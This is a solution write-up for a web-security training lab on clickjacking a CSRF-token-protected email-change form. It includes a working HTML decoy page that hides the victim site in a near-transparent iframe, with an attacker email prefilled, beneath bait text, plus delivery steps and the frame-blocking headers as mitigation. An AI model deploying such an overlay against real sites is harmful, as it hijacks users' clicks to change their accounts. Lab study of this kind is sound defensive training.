# Lab 01 — Basic clickjacking with CSRF token protection

> **Practitioner** · [Official lab](https://portswigger.net/web-security/clickjacking/basic-csrf-protected)

**Entry point:** `POST /my-account/change-email` — protected by a CSRF token
(and the form is prefilled via `?email=`), so pure request forgery fails —
but the **click** can be hijacked.

## Solution

1. Note the email form is prefilled from `GET /my-account?email=...` — the
   victim's own form carries the valid CSRF token.
2. On the exploit server, build a decoy page that overlays the form's
   **submit** button on top of the site's "Update email" button:

```html
<style>
  iframe { position: relative; width: 700px; height: 500px; opacity: 0.0001;
           z-index: 2; }
  div   { position: absolute; top: 400px; left: 60px; z-index: 1; }
</style>
<div>Click the prize!</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil-you.net"></iframe>
```

3. Tune `top/left` until the invisible iframe's submit button sits exactly
   over the decoy text.
4. Deliver to victim — their click submits the prefilled (token-valid) form —
   lab solved.

## Mitigation

`X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`.
